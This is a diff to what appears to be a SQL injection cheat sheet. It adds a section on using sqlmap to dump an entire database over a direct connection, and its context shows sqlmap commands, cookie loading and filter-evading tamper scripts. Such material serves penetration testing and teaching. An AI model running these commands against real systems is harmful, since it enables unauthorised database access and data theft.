@@ -30,6 +30,7 @@ Attempting to manipulate SQL queries may have goals including:
   * [Using Chrome cookie and a Proxy](#using-chrome-cookie-and-a-proxy)
   * [Using suffix to tamper the injection](#using-suffix-to-tamper-the-injection)
   * [General tamper option and tamper's list](#general-tamper-option-and-tampers-list)
+  * [SQLmap without SQL injection](#sqlmap-without-sql-injection)
 * [Authentication bypass](#authentication-bypass)
   * [Authentication Bypass (Raw MD5 SHA1)](#authentication-bypass-raw-md5-sha1)
 * [Polyglot injection](#polyglot-injection-multicontext)
@@ -200,6 +201,7 @@ sqlmap -u "https://test.com/index.php?id=99" --load-cookie=/media/truecrypt1/TI/
 python sqlmap.py -u "http://example.com/?id=1"  -p id --suffix="-- "
 ```
 
+
 ### General tamper option and tamper's list
 
 ```powershell
@@ -266,6 +268,14 @@ tamper=name_of_the_tamper
 |versionedkeywords.py | Encloses each non-function keyword with versioned MySQL comment |
 |versionedmorekeywords.py | Encloses each keyword with versioned MySQL comment |
 |xforwardedfor.py | Append a fake HTTP header 'X-Forwarded-For'|
+
+### SQLmap without SQL injection
+
+You can use SQLmap to access a database via its port instead of a URL.
+
+```ps1
+sqlmap.py -d "mysql://user:pass@ip/database" --dump-all 
+```
 
 ## Authentication bypass
 
